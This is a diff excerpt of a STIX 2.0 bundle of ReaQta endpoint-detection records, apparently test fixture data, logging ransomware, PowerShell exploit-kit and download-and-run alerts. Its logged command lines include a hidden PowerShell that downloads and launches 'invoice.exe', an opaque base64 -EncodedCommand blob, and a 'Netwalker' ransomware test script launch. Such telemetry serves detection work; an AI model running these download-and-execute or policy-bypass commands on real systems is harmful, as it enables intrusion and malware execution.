           "creator_user_ref": "5",
-          "name": "powershell.exe",
-          "parent_ref": "7",
           "pid": 22475614444,
-          "type": "process"
+          "parent_ref": "7"
         },
         "3": {
-          "path": "\\Device\\HarddiskVolume4\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
-          "type": "directory"
+          "type": "directory",
+          "path": "\\Device\\HarddiskVolume4\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"
         },
         "4": {
-          "agent_local_time": "2023-01-27T12:31:25.038000Z",
-          "agent_version": "6.22.13607.0",
-          "confidence": 80,
-          "detection_id": "ldt:0a3e7f1d15874c09ad37dae363774e50:21477405166",
-          "first_seen": "2023-01-27T12:31:25.038000Z",
-          "ioc_value": "VMware, Inc.",
-          "last_seen": "2023-01-27T12:31:25.038000Z",
-          "platform_id": "0",
+          "type": "x-reaqta",
           "scenario": "data_loss",
           "tactic": "Impact",
           "tactic_id": "TA0040",
           "technique": "Data Encrypted for Impact",
           "technique_id": "T1486",
-          "type": "x-reaqta"
+          "confidence": 80,
+          "detection_id": "ldt:0a3e7f1d15874c09ad37dae363774e50:21477405166",
+          "agent_local_time": "2022-12-12T15:37:04.627Z",
+          "agent_version": "6.22.13607.0",
+          "ioc_value": "VMware, Inc.",
+          "first_seen": "2022-12-12T15:37:12Z",
+          "last_seen": "2022-12-12T15:37:42Z",
+          "platform_id": "0"
         },
         "5": {
-          "account_login": "fadams",
           "type": "user-account",
+          "account_login": "fadams",
           "user_id": "A-2-3-4-333-444-222-1001"
         },
         "6": {
+          "type": "file",
           "hashes": {
-            "MD5": "73b7a0103cb74d7f763ff7f43b95168a",
-            "SHA-256": "e99613d7a57a80ea3ec27c8aa8dbb37a6d80f2adeb7f02ede03c7861bd448f16"
-          },
-          "type": "file"
+            "SHA-256": "e99613d7a57a80ea3ec27c8aa8dbb37a6d80f2adeb7f02ede03c7861bd448f16",
+            "MD5": "73b7a0103cb74d7f763ff7f43b95168a"
+          }
         },
         "7": {
+          "type": "process",
           "binary_ref": "6",
           "command_line": "\"C:\\Users\\fadams\\Downloads\\6252822930423808\\e99613d7a57a80ea3ec27c8aa8dbb37a6d80f2adeb7f02ede03c7861bd448f16.exe\" ",
-          "pid": 22472903178,
-          "type": "process"
+          "pid": 22472903178
         },
         "8": {
           "type": "ipv4-addr",
           "value": "45.155.205.233"
         },
         "9": {
-          "hostname": "Frank-PC",
+          "type": "x-oca-asset",
           "ip_refs": [
             "8",
             "10"
           ],
+          "hostname": "Frank-PC",
           "mac_refs": [
             "11"
           ],
-          "os_platform": "Windows",
           "os_version": "Windows 10",
-          "type": "x-oca-asset"
+          "os_platform": "Windows"
         },
         "10": {
           "type": "ipv4-addr",
@@ -673,321 +671,322 @@
           "value": "00:0a:11:f1:00:0x"
         }
       },
-      "type": "observed-data"
+      "first_observed": "2022-12-12T15:37:24Z",
+      "last_observed": "2022-12-12T15:37:24Z",
+      "number_observed": 1
     },
-    {
-      "created": "2023-01-27T12:32:25.038000Z",
-      "created_by_ref": "identity--fa188421-a904-4e95-a3a4-309a558b9295",
-      "first_observed": "2023-01-27T12:32:25.038000Z",
+	    {
       "id": "observed-data--08a61c11-72b8-4d2a-bee3-5ffa43f3da88",
-      "last_observed": "2023-01-27T12:32:25.038000Z",
-      "modified": "2023-01-27T12:32:25.038000Z",
-      "number_observed": 1,
+      "type": "observed-data",
+      "created_by_ref": "identity--fa188421-a904-4e95-a3a4-309a558b9295",
+      "created": "2022-12-12T15:38:43.729Z",
+      "modified": "2022-12-12T15:38:43.729Z",
       "objects": {
         "0": {
-          "action": "library load",
-          "created": "2023-01-27T12:32:25.038000Z",
-          "file_ref": "12",
-          "host_ref": "9",
-          "outcome": "A PowerShell process downloaded and launched a remote file. This is often the result of a malicious macro designed to drop a variety of second stage payloads. Review the command line.",
-          "parent_process_ref": "7",
+          "type": "x-oca-event",
+          "created": "2022-12-12T15:38:14Z",
           "process_ref": "2",
-          "provider": "ReaQta",
+          "action": "library load",
+          "outcome": "A PowerShell process downloaded and launched a remote file. This is often the result of a malicious macro designed to drop a variety of second stage payloads. Review the command line.",
           "severity": 70,
-          "type": "x-oca-event"
+          "parent_process_ref": "7",
+          "host_ref": "9",
+          "file_ref": "12",
+          "provider": "ReaQta"
         },
         "1": {
-          "hashes": {
-            "MD5": "04029e121a0cfa5991749937dd22a1d9",
-            "SHA-256": "9f914d42706fe215501044acd85a32d58aaef1419d404fddfa5d3b48f66ccd9f"
-          },
+          "type": "file",
           "name": "powershell.exe",
           "parent_directory_ref": "3",
-          "type": "file"
+          "hashes": {
+            "SHA-256": "9f914d42706fe215501044acd85a32d58aaef1419d404fddfa5d3b48f66ccd9f",
+            "MD5": "04029e121a0cfa5991749937dd22a1d9"
+          }
         },
         "2": {
+          "type": "process",
           "binary_ref": "1",
+          "name": "powershell.exe",
           "command_line": "powershell.exe -NoExit -ExecutionPolicy Bypass -WindowStyle Hidden $ErrorActionPreference= 'silentlycontinue';(New-Object System.Net.WebClient).DownloadFile('http://127.0.0.1/1.exe', 'C:\\\\test-WDATP-test\\\\invoice.exe');Start-Process 'C:\\\\test-WDATP-test\\\\invoice.exe'",
           "creator_user_ref": "5",
-          "name": "powershell.exe",
-          "parent_ref": "7",
           "pid": 580434880660,
-          "type": "process"
+          "parent_ref": "7"
         },
         "3": {
-          "path": "\\Device\\HarddiskVolume2\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
-          "type": "directory"
+          "type": "directory",
+          "path": "\\Device\\HarddiskVolume2\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"
         },
         "4": {
-          "agent_local_time": "2023-01-27T12:32:25.038000Z",
-          "agent_version": "6.25.13909.0",
-          "confidence": 80,
-          "detection_id": "ldt:0d6ca15ba400411eafe2e6b38245df9e:249111658855",
-          "first_seen": "2023-01-27T12:32:25.038000Z",
-          "ioc_value": "Phoenix Technologies LTD",
-          "last_seen": "2023-01-27T12:32:25.038000Z",
-          "platform_id": "0",
+          "type": "x-reaqta",
           "scenario": "attacker_methodology",
           "tactic": "Execution",
           "tactic_id": "TA0002",
           "technique": "PowerShell",
           "technique_id": "T1059.001",
-          "type": "x-reaqta"
+          "confidence": 80,
+          "detection_id": "ldt:0d6ca15ba400411eafe2e6b38245df9e:249111658855",
+          "agent_local_time": "2022-12-12T15:38:06.083Z",
+          "agent_version": "6.25.13909.0",
+          "ioc_value": "Phoenix Technologies LTD",
+          "first_seen": "2022-12-12T15:38:49Z",
+          "last_seen": "2022-12-12T15:38:56Z",
+          "platform_id": "0"
         },
         "5": {
-          "account_login": "fadams",
           "type": "user-account",
+          "account_login": "fadams",
           "user_id": "S-1-5-21-2278378498-3412194288-3958728464-1001"
         },
         "6": {
+          "type": "file",
           "hashes": {
-            "MD5": "04029e121a0cfa5991749937dd22a1d9",
-            "SHA-256": "9f914d42706fe215501044acd85a32d58aaef1419d404fddfa5d3b48f66ccd9f"
-          },
-          "type": "file"
+            "SHA-256": "9f914d42706fe215501044acd85a32d58aaef1419d404fddfa5d3b48f66ccd9f",
+            "MD5": "04029e121a0cfa5991749937dd22a1d9"
+          }
         },
         "7": {
+          "type": "process",
           "binary_ref": "6",
           "command_line": "powershell.exe -NonInteractive -NoProfile -ExecutionPolicy Bypass -EncodedCommand CgAgACAAIAAgAHQAcgBhAHAAIAB7AAoAIAAgACAAIAAgACAAIAAgACQAdwByAGEAcABwAGUAcgBfAHAAYQB0AGgAIAA9ACAAIgAkACgAJABlAG4AdgA6AFQARQBNAFAAKQBcAGEAbgBzAGkAYgBsAGUALQBhAHMAeQBuAGMALQB3AHIAYQBwAHAAZQByAC0AZQByAHIAbwByAC0AJAAoAEcAZQB0AC0ARABhAHQAZQAgAC0ARgBvAHIAbQBhAHQAIAAiAHkAeQB5AHkALQBNAE0ALQBkAGQAVABIAEgALQBtAG0ALQBzAHMALgBmAGYAZgBmAFoAIgApAC4AdAB4AHQAIgAKACAAIAAgACAAIAAgACAAIAAkAGUAcgByAG8AcgBfAG0AcwBnACAAPQAgACIARQByAHIAbwByACAAdwBoAGkAbABlACAAcgB1AG4AbgBpAG4AZwAgAHQAaABlACAAYQBzAHkAbgBjACAAZQB4AGUAYwAgAHcAcgBhAHAAcABlAHIAYAByAGAAbgAkACgAJABfACAAfAAgAE8AdQB0AC0AUwB0AHIAaQBuAGcAKQBgAHIAYABuACQAKAAkAF8ALgBTAGMAcgBpAHAAdABTAHQAYQBjAGsAVAByAGEAYwBlACkAIgAKACAAIAAgACAAIAAgACAAIABTAGUAdAAtAEMAbwBuAHQAZQBuAHQAIAAtAFAAYQB0AGgAIAAkAHcAcgBhAHAAcABlAHIAXwBwAGEAdABoACAALQBWAGEAbAB1AGUAIAAkAGUAcgByAG8AcgBfAG0AcwBnAAoAIAAgACAAIAAgACAAIAAgAGIAcgBlAGEAawAKACAAIAAgACAAfQAKACAAIAAgACAAJgBjAGgAYwBwAC4AYwBvAG0AIAA2ADUAMAAwADEAIAA+ACAAJABuAHUAbABsAAoAIAAgACAAIAAkAHAAaQBwAGUAXwBuAGEAbQBlACAAPQAgACIAYQBuAHMAaQBiAGwAZQAtAGEAcwB5AG4AYwAtADcAMgAxADYAOAAzADQAMQAyADMANwA2AC0AYwAzADgANAAxAGQAYgBiAC0AYQBmAGYAZAAtADQAYgAxAGYALQA5ADkAYgAxAC0AOQBhADEAMwBiADAAYQBiADUANwA3AGMAIgAKACAAIAAgACAAJABiAHkAdABlAHMAXwBsAGUAbgBnAHQAaAAgAD0AIAAxADEANQAwADAAOQAKACAAIAAgACAAJABpAG4AcAB1AHQAXwBiAHkAdABlAHMAIAA9ACAATgBlAHcALQBPAGIAagBlAGMAdAAgAC0AVAB5AHAAZQBOAGEAbQBlACAAYgB5AHQAZQBbAF0AIAAtAEEAcgBnAHUAbQBlAG4AdABMAGkAcwB0ACAAJABiAHkAdABlAHMAXwBsAGUAbgBnAHQAaAAKACAAIAAgACAAJABwAGkAcABlACAAPQAgAE4AZQB3AC0ATwBiAGoAZQBjAHQAIAAtAFQAeQBwAGUATgBhAG0AZQAgAFMAeQBzAHQAZQBtAC4ASQBPAC4AUABpAHAAZQBzAC4ATgBhAG0AZQBkAFAAaQBwAGUAQwBsAGkAZQBuAHQAUwB0AHIAZQBhAG0AIAAtAEEAcgBnAHUAbQBlAG4AdABMAGkAcwB0ACAAQAAoAAoAIAAgACAAIAAgACAAIAAgACIALgAiACwAIAAgACMAIABsAG8AYwBhAGwAaABvAHMAdAAKACAAIAAgACAAIAAgACAAIAAkAHAAaQBwAGUAXwBuAGEAbQBlACwACgAgACAAIAAgACAAIAAgACAAWwBTAHkAcwB0AGUAbQAuAEkATwAuAFAAaQBwAGUAcwAuAFAAaQBwAGUARABpAHIAZQBjAHQAaQBvAG4AXQA6ADoASQBuACwACgAgACAAIAAgACAAIAAgACAAWwBTAHkAcwB0AGUAbQAuAEkATwAuAFAAaQBwAGUAcwAuAFAAaQBwAGUATwBwAHQAaQBvAG4AcwBdADoAOgBOAG8AbgBlACwACgAgACAAIAAgACAAIAAgACAAWwBTAHkAcwB0AGUAbQAuAFMAZQBjAHUAcgBpAHQAeQAuAFAAcgBpAG4AYwBpAHAAYQBsAC4AVABvAGsAZQBuAEkAbQBwAGUAcgBzAG8AbgBhAHQAaQBvAG4ATABlAHYAZQBsAF0AOgA6AEEAbgBvAG4AeQBtAG8AdQBzAAoAIAAgACAAIAApAAoAIAAgACAAIAB0AHIAeQAgAHsACgAgACAAIAAgACAAIAAgACAAJABwAGkAcABlAC4AQwBvAG4AbgBlAGMAdAAoACkACgAgACAAIAAgACAAIAAgACAAJABwAGkAcABlAC4AUgBlAGEAZAAoACQAaQBuAHAAdQB0AF8AYgB5AHQAZQBzACwAIAAwACwAIAAkAGIAeQB0AGUAcwBfAGwAZQBuAGcAdABoACkAIAA+ACAAJABuAHUAbABsAAoAIAAgACAAIAB9ACAAZgBpAG4AYQBsAGwAeQAgAHsACgAgACAAIAAgACAAIAAgACAAJABwAGkAcABlAC4AQwBsAG8AcwBlACgAKQAKACAAIAAgACAAfQAKACAAIAAgACAAJABlAHgAZQBjACAAPQAgAFsAUwB5AHMAdABlAG0ALgBUAGUAeAB0AC4ARQBuAGMAbwBkAGkAbgBnAF0AOgA6AFUAVABGADgALgBHAGUAdABTAHQAcgBpAG4AZwAoACQAaQBuAHAAdQB0AF8AYgB5AHQAZQBzACkACgAgACAAIAAgACQAZQB4AGUAYwBfAHAAYQByAHQAcwAgAD0AIAAkAGUAeABlAGMALgBTAHAAbABpAHQAKABAACgAIgBgADAAYAAwAGAAMABgADAAIgApACwAIAAyACwAIABbAFMAdAByAGkAbgBnAFMAcABsAGkAdABPAHAAdABpAG8AbgBzAF0AOgA6AFIAZQBtAG8AdgBlAEUAbQBwAHQAeQBFAG4AdAByAGkAZQBzACkACgAgACAAIAAgAFMAZQB0AC0AVgBhAHIAaQBhAGIAbABlACAALQBOAGEAbQBlACAAagBzAG8AbgBfAHIAYQB3ACAALQBWAGEAbAB1AGUAIAAkAGUAeABlAGMAXwBwAGEAcgB0AHMAWwAxAF0ACgAgACAAIAAgACQAZQB4AGUAYwAgAD0AIABbAFMAYwByAGkAcAB0AEIAbABvAGMAawBdADoAOgBDAHIAZQBhAHQAZQAoACQAZQB4AGUAYwBfAHAAYQByAHQAcwBbADAAXQApAAoAIAAgACAAIAAmACQAZQB4AGUAYwAKAA==",
-          "pid": 580427087513,
-          "type": "process"
+          "pid": 580427087513
         },
         "8": {
           "type": "ipv4-addr",
           "value": "45.155.205.233"
         },
         "9": {
-          "hostname": "Frank-PC",
+          "type": "x-oca-asset",
           "ip_refs": [
             "8",
             "10"
           ],
+          "hostname": "Frank-PC",
           "mac_refs": [
             "11"
           ],
-          "os_platform": "Windows",
           "os_version": "Windows 10",
-          "type": "x-oca-asset"
+          "os_platform": "Windows"
         },
         "10": {
           "type": "ipv4-addr",
-          "value": "192.168.6.242"
+          "value": "192.167.1.30"
         },
         "11": {
           "type": "mac-addr",
           "value": "00:50:56:01:06:b1"
         },
         "12": {
+          "type": "file",
           "hashes": {
             "SHA-256": "9f914d42706fe215501044acd85a32d58aaef1419d404fddfa5d3b48f66ccd9f"
-          },
-          "type": "file"
+          }
         }
       },
-      "type": "observed-data"
+      "first_observed": "2022-12-12T15:38:14Z",
+      "last_observed": "2022-12-12T15:38:14Z",
+      "number_observed": 1
     },
-    {
-      "created": "2023-01-27T12:33:25.038000Z",
-      "created_by_ref": "identity--fa188421-a904-4e95-a3a4-309a558b9295",
-      "first_observed": "2023-01-27T12:33:25.038000Z",
+	{
       "id": "observed-data--7ec5f4d1-741b-4206-9a4f-f2c87169c59f",
-      "last_observed": "2023-01-27T12:33:25.038000Z",
-      "modified": "2023-01-27T12:33:25.038000Z",
-      "number_observed": 1,
+      "type": "observed-data",
+      "created_by_ref": "identity--fa188421-a904-4e95-a3a4-309a558b9295",
+      "created": "2022-12-12T15:39:43.733Z",
+      "modified": "2022-12-12T15:39:43.733Z",
       "objects": {
         "0": {
-          "action": "PShellExploitKit2",
-          "created": "2023-01-27T12:33:25.038000Z",
-          "host_ref": "9",
-          "outcome": "A PowerShell script launched that shares characteristics with known PowerShell exploit kits. The script might connect to remote command and control. Decode and review the script.",
-          "parent_process_ref": "7",
+          "type": "x-oca-event",
+          "created": "2022-12-12T15:39:23Z",
           "process_ref": "2",
-          "provider": "ReaQta",
+          "action": "PShellExploitKit2",
+          "outcome": "A PowerShell script launched that shares characteristics with known PowerShell exploit kits. The script might connect to remote command and control. Decode and review the script.",
           "severity": 70,
-          "type": "x-oca-event"
+          "parent_process_ref": "7",
+          "host_ref": "9",
+          "provider": "ReaQta"
         },
         "1": {
+          "type": "file",
           "name": "powershell.exe",
-          "parent_directory_ref": "3",
-          "type": "file"
+          "parent_directory_ref": "3"
         },
         "2": {
+          "type": "process",
           "binary_ref": "1",
+          "name": "powershell.exe",
           "command_line": "\"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\" ",
           "creator_user_ref": "5",
-          "name": "powershell.exe",
-          "parent_ref": "7",
           "pid": 63498532492,
-          "type": "process"
+          "parent_ref": "7"
         },
         "3": {
-          "path": "\\Device\\HarddiskVolume4\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
-          "type": "directory"
+          "type": "directory",
+          "path": "\\Device\\HarddiskVolume4\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"
         },
         "4": {
-          "agent_local_time": "2023-01-27T12:33:25.038000Z",
-          "agent_version": "6.22.13607.0",
-          "confidence": 80,
-          "detection_id": "ldt:7c26832416cc4c4abb58aac1f2651009:47245593083",
-          "first_seen": "2023-01-27T12:33:25.038000Z",
-          "ioc_value": "VMware, Inc.",
-          "last_seen": "2023-01-27T12:33:25.038000Z",
-          "machine_domain": "bigcorp.local",
-          "platform_id": "0",
+          "type": "x-reaqta",
           "scenario": "attacker_methodology",
           "tactic": "Execution",
           "tactic_id": "TA0002",
           "technique": "PowerShell",
           "technique_id": "T1059.001",
-          "type": "x-reaqta"
+          "confidence": 80,
+          "detection_id": "ldt:7c26832416cc4c4abb58aac1f2651009:47245593083",
+          "agent_local_time": "2022-12-12T15:39:59.721Z",
+          "agent_version": "6.22.13607.0",
+          "ioc_value": "VMware, Inc.",
+          "first_seen": "2020-12-14T14:59:17Z",
+          "last_seen": "2022-12-12T15:39:18Z",
+          "machine_domain": "bigcorp.local",
+          "platform_id": "0"
         },
         "5": {
-          "account_login": "fadams",
           "type": "user-account",
+          "account_login": "fadams",
           "user_id": "S-1-5-21-905169310-3050756826-3851703859-1001"
         },
         "6": {
+          "type": "file",
           "hashes": {
-            "MD5": "021a4a566ae86079929a482dce9b76a7",
-            "SHA-256": "3f00013865e06a7d402e8565c6c553ed6099bc8e3d73c85e34292596c5a82d4d"
-          },
-          "type": "file"
+            "SHA-256": "3f00013865e06a7d402e8565c6c553ed6099bc8e3d73c85e34292596c5a82d4d",
+            "MD5": "021a4a566ae86079929a482dce9b76a7"
+          }
         },
         "7": {
+          "type": "process",
           "binary_ref": "6",
           "command_line": "C:\\Windows\\Explorer.EXE",
-          "pid": 63403618485,
-          "type": "process"
+          "pid": 63403618485
         },
         "8": {
           "type": "ipv4-addr",
           "value": "37.120.215.227"
         },
         "9": {
-          "hostname": "Frank-PC",
+          "type": "x-oca-asset",
           "ip_refs": [
             "8",
             "10"
           ],
+          "hostname": "RL-BJO-WIN10FL-",
           "mac_refs": [
             "11"
           ],
-          "os_platform": "Windows",
           "os_version": "Windows 10",
-          "type": "x-oca-asset"
+          "os_platform": "Windows"
         },
         "10": {
           "type": "ipv4-addr",
-          "value": "192.168.6.242"
+          "value": "10.0.0.226"
         },
         "11": {
           "type": "mac-addr",
           "value": "00:0c:29:e6:9b:db"
         }
       },
-      "type": "observed-data"
+      "first_observed": "2022-12-12T15:39:23Z",
+      "last_observed": "2022-12-12T15:39:23Z",
+      "number_observed": 1
     },
-    {
-      "created": "2023-01-27T12:34:25.038000Z",
-      "created_by_ref": "identity--fa188421-a904-4e95-a3a4-309a558b9295",
-      "first_observed": "2023-01-27T12:34:25.038000Z",
+	    {
       "id": "observed-data--79d65c3a-233c-4b4d-8f0a-e2e68d78a146",
-      "last_observed": "2023-01-27T12:34:25.038000Z",
-      "modified": "2023-01-27T12:34:25.038000Z",
-      "number_observed": 1,
+      "type": "observed-data",
+      "created_by_ref": "identity--fa188421-a904-4e95-a3a4-309a558b9295",
+      "created": "2022-12-12T15:39:43.733Z",
+      "modified": "2022-12-12T15:39:43.733Z",
       "objects": {
         "0": {
-          "action": "ProcRansomware",
-          "created": "2023-01-27T12:34:25.038000Z",
-          "host_ref": "9",
-          "outcome": "A process associated with a known ransomware campaign launched. Investigate the host for signs of a ransomware attack.",
-          "parent_process_ref": "7",
+          "type": "x-oca-event",
+          "created": "2022-12-12T15:39:16Z",
           "process_ref": "2",
-          "provider": "ReaQta",
+          "action": "ProcRansomware",
+          "outcome": "A process associated with a known ransomware campaign launched. Investigate the host for signs of a ransomware attack.",
           "severity": 70,
-          "type": "x-oca-event"
+          "parent_process_ref": "7",
+          "host_ref": "9",
+          "provider": "ReaQta"
         },
         "1": {
+          "type": "file",
           "name": "powershell.exe",
-          "parent_directory_ref": "3",
-          "type": "file"
+          "parent_directory_ref": "3"
         },
         "2": {
+          "type": "process",
           "binary_ref": "1",
+          "name": "powershell.exe",
           "command_line": "\"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\" \"-Command\" \"if((Get-ExecutionPolicy ) -ne 'AllSigned') { Set-ExecutionPolicy -Scope Process Bypass }; & 'C:\\Users\\reaqta\\Desktop\\Test_File_Repository\\Powershell_Netwalker\\iguana2.ps1'\"",
           "creator_user_ref": "5",
-          "name": "powershell.exe",
-          "parent_ref": "7",
           "pid": 403930036222,
-          "type": "process"
+          "parent_ref": "7"
         },
         "3": {
-          "path": "\\Device\\HarddiskVolume3\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
-          "type": "directory"
+          "type": "directory",
+          "path": "\\Device\\HarddiskVolume3\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"
         },
         "4": {
-          "agent_local_time": "2023-01-27T12:34:25.038000Z",
-          "agent_version": "6.22.13607.0",
-          "confidence": 80,
-          "detection_id": "ldt:e71b6d8f42584c91babfb9f18bc8f2bf:369369061502",
-          "first_seen": "2023-01-27T12:34:25.038000Z",
-          "ioc_value": "VMware, Inc.",
-          "last_seen": "2023-01-27T12:34:25.038000Z",
-          "platform_id": "0",
+          "type": "x-reaqta",
           "scenario": "ransomware",
           "tactic": "Impact",
           "tactic_id": "TA0040",
           "technique": "Data Encrypted for Impact",
           "technique_id": "T1486",
-          "type": "x-reaqta"
+          "confidence": 80,
+          "detection_id": "ldt:e71b6d8f42584c91babfb9f18bc8f2bf:369369061502",
+          "agent_local_time": "2022-12-06T17:11:04.106Z",
+          "agent_version": "6.22.13607.0",
+          "ioc_value": "VMware, Inc.",
+          "first_seen": "2022-12-12T15:39:53Z",
+          "last_seen": "2022-12-12T15:39:30Z",
+          "platform_id": "0"
         },
         "5": {
-          "account_login": "fadams",
           "type": "user-account",
+          "account_login": "reaqta",
           "user_id": "S-1-5-21-4124038817-4173282017-4184401995-1001"
         },
         "6": {
+          "type": "file",
           "hashes": {
-            "MD5": "91bcfcab8092a94cb7d60509ba75ed1c",
-            "SHA-256": "2bc6a8de31ee747f11d8eb2dc8494b093348a7ed02a4b16c1b488fdd55205b80"
-          },
-          "type": "file"
+            "SHA-256": "2bc6a8de31ee747f11d8eb2dc8494b093348a7ed02a4b16c1b488fdd55205b80",
+            "MD5": "91bcfcab8092a94cb7d60509ba75ed1c"
+          }
         },
         "7": {
+          "type": "process",
           "binary_ref": "6",
           "command_line": "C:\\Windows\\Explorer.EXE",
-          "pid": 403847746462,
-          "type": "process"
+          "pid": 403847746462
         },
         "8": {
           "type": "ipv4-addr",
-          "value": "45.155.205.233"
+          "value": "49.206.231.58"
         },
         "9": {
-          "hostname": "Frank-PC",
+          "type": "x-oca-asset",
           "ip_refs": [
             "8",
             "10"
           ],
+          "hostname": "XFESS-LAB3",
           "mac_refs": [
             "11"
           ],
-          "os_platform": "Windows",
           "os_version": "Windows 10",
-          "type": "x-oca-asset"
+          "os_platform": "Windows"
         },
         "10": {
           "type": "ipv4-addr",
-          "value": "192.168.6.242"
+          "value": "192.168.58.130"
         },
         "11": {
           "type": "mac-addr",
           "value": "00:0c:29:f2:9d:5f"
         }
       },
-      "type": "observed-data"
+      "first_observed": "2022-12-12T15:39:16Z",
+      "last_observed": "2022-12-12T15:39:16Z",
+      "number_observed": 1
     }
-  ],
-  "spec_version": "2.0",
-  "type": "bundle"
+	  ]
 }
+	
